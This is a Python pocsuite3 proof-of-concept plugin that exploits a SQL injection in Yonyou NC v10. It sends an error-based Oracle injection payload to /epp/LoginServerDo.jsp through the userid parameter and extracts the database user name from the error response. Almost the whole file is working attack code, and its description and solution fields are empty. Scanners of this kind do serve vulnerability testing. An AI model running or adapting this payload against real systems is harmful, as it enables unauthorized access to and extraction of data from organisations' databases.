#!/usr/bin/env python
# -*- coding: utf-8 -*-
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url
import re


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''用友NC_LoginServerDo_sqli'''
    desc = ''''''
    solution = ''''''
    severity = '''high'''
    vulType = '''sql-inj'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = '''NC'''
    appVersion = '''v10'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        result = {}
        self.url, ip, port = parse_ip_port(self.target, 80)
        vulurl = make_verify_url(self.url, "/epp/LoginServerDo.jsp?userid=1111' AND 2869=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(98)||CHR(106)||CHR(113)||(REPLACE(REPLACE(REPLACE(REPLACE((SELECT NVL(CAST(USER AS VARCHAR(4000)),CHR(32)) FROM DUAL),CHR(32),CHR(113)||CHR(120)||CHR(113)),CHR(36),CHR(113)||CHR(113)||CHR(113)),CHR(64),CHR(113)||CHR(111)||CHR(113)),CHR(35),CHR(113)||CHR(109)||CHR(113)))||CHR(113)||CHR(98)||CHR(113)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL)-- -&pwd=2222", mod=0)
        resp = requests.get(vulurl, verify=False, timeout=15)
        re_result = re.findall(b'qqbjq(.+?)qbqkq',resp.content, re.I | re.M)
        if len(re_result) > 0 and resp.status_code == 500:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = self.url
            result['VerifyInfo']['port'] = port
            result['VerifyInfo']['DBname'] = re_result[0].decode()
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
